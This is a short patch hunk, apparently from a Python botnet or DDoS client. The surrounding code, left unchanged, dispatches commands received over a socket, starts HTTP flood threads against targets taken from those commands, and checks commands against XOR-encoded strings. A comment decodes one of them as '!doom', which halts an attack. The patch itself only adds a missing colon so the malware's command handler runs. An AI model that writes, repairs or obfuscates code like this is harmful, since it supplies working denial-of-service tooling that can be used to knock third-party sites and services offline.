@@ -118,7 +118,7 @@ def handle(sock):
 						p = threading.Thread(target=HTTP, args =(command[1],command[2],command[4]))
 						p.start()
 					attack+=1
-				elif command[0] == xor_dec('QBcLCQo=',key)#encoded word !doom
+				elif command[0] == xor_dec('QBcLCQo=',key):#encoded word !doom
 					if attack != 0:
 						stop = True
 						attack =0
